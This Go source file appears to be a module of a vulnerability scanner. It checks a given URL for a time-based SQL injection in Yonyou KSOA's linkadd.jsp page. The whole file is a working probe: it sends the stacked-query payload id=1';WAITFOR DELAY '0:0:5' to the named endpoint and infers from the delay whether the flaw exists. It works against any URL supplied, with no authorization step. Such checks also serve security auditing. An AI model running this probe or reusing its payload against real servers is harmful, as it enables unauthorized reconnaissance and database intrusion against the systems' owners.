package KSOA_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(7 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	// 正常请求
	normalURL := url + "/linksframe/linkadd.jsp"
	startNormal := time.Now()
	_, err := client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(normalURL)
	normalDuration := time.Since(startNormal)

	if err != nil {
		color.Red.Println("[-] 请求失败或无法确定用友时空linkadd SQL注入漏洞")
		return
	}

	// SQL注入测试请求
	injectionURL := url + "/linksframe/linkadd.jsp?id=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27"
	startInjection := time.Now()
	_, err = client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(injectionURL)
	injectionDuration := time.Since(startInjection)

	if err != nil {
		color.Red.Println("[-] 用友时空linkadd SQL注入漏洞检测失败")
		return
	}

	// 判断逻辑
	if injectionDuration > normalDuration+5*time.Second {
		color.Green.Println("[+] 用友时空 linkadd SQL注入漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-] 用友时空 linkadd SQL注入漏洞不存在")
	}
}
